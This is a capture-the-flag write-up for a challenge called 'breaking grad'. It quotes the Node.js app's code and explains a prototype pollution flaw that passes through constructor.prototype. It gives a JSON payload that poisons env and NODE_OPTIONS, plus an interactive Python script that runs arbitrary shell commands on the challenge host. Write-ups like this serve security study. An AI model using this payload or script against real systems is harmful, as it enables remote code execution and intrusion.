# breaking grad
![Screenshot from 2021-08-19 22-04-48](https://user-images.githubusercontent.com/87865134/130092858-5af8eb20-7c42-4eeb-8b35-6114d06a4eda.png)

## Information Gathering
- router `/api/caculate
```JavaScript
router.post('/api/calculate', (req, res) => {
    let student = ObjectHelper.clone(req.body);

    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasBase(student.paper)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }

    return res.send({
        'pass': 'Passed'
    });
});
```
- ObjectHelper.js
```JavaScript
module.exports = {
    isObject(obj) {
        return typeof obj === 'function' || typeof obj === 'object';
    },

    isValidKey(key) {
        return key !== '__proto__';
    },

    merge(target, source) {
        for (let key in source) {
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
        }
        return target;
    },

    clone(target) {
        return this.merge({}, target);
    }
}
```
- router `/debug/:action`
```JavaScript
router.get('/debug/:action', (req, res) => {
    return DebugHelper.execute(res, req.params.action);
});
```
- DebugHelper.js
```JavaScript
const { execSync, fork } = require('child_process');

module.exports = {
    execute(res, command) {

        res.type('txt');

        if (command == 'version') {
            let proc = fork('VersionCheck.js', [], {
                stdio: ['ignore', 'pipe', 'pipe', 'ipc']
            });

            proc.stderr.pipe(res);
            proc.stdout.pipe(res);

            return;
        } 
        
        if (command == 'ram') {
            return res.send(execSync('free -m').toString());
        }
        
        return res.send('invalid command');
    }
}
```
- VersionCheck.js
```JavaScript
const package = require('./package.json');
const nodeVersion = process.version;

if (package.nodeVersion == nodeVersion) {
    console.log(`Everything is OK (${package.nodeVersion} == ${nodeVersion})`);
}else{
    console.log(`You are using a different version of nodejs (${package.nodeVersion} != ${nodeVersion})`);
}
```

## Analysis
- `ObjectHelper` has `merge()` function is a vulnerability because it return an object from json => maybe AST Injection
- `DebugHelper` use `fork()` to **spawn** a new process => able to posion the evironmental variables -> execute commands
- It's also possible to poison environmental variables by setting the `env` property in some object inside JS

## Exploit
- payload:
```json
{
        "name":"Cat",
        "constructor":{
            "prototype":{
                "env":{ 
                    "EVIL":"console.log(require('child_process').execSync('ls').toString())//"
                },
                "NODE_OPTIONS":"--require /proc/self/environ"
            }
        }
    }
```
- python script:
```python
import requests

url = 'http://142.93.35.92:31456'

def get_payload(cmd):
    return  {
        "name":"Cat",
        "constructor":{
            "prototype":{
                "env":{ 
                    "EVIL":"console.log(require('child_process').execSync('"+cmd+"').toString())//"
                },
                "NODE_OPTIONS":"--require /proc/self/environ"
            }
        }
    }

while (1):
    cmd = input("cmd: ")
    if cmd == 'q':
        exit()
    requests.post(url + '/api/calculate', json=get_payload(cmd))
    res = requests.get(url + '/debug/version')
    print(res.text)
```
- run script to get flag

![Screenshot from 2021-08-19 22-32-21](https://user-images.githubusercontent.com/87865134/130097625-bec5f25b-2033-4650-a584-6e4b8b267f92.png)

## Description
- **category:** AST Injection

## Reference
- https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#rce-abusing-environmental-variables
